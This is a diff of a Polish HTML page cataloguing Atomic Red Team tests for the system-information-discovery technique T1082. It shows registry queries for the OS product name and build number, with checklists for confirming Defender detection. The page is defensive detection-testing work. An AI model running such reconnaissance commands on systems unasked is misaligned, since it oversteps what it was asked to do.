+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\Enumerate_Available_Drives_via_gdr\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art26" data-scenario="scenarioBlock" data-label="Atomic Test 26: Enumerate Available Drives via gdr">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art26','scenarioBlock','Atomic Test 26: Enumerate Available Drives via gdr')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 27: Discover OS Product Name via Registry</b>
+        <span id="tested-badge-T1082-art27" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion&quot; /v ProductName</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\Discover_OS_Product_Name_via_Registry\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art27" data-scenario="scenarioBlock" data-label="Atomic Test 27: Discover OS Product Name via Registry">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art27','scenarioBlock','Atomic Test 27: Discover OS Product Name via Registry')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 28: Discover OS Build Number via Registry</b>
+        <span id="tested-badge-T1082-art28" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion&quot; /v CurrentBuildNumber</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\Discover_OS_Build_Number_via_Registry\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art28" data-scenario="scenarioBlock" data-label="Atomic Test 28: Discover OS Build Number via Registry">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art28','scenarioBlock','Atomic Test 28: Discover OS Build Number via Registry')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
   <div class="author section"><b>Author:</b> Krzysztof K.</div>
 </div>
 </body>
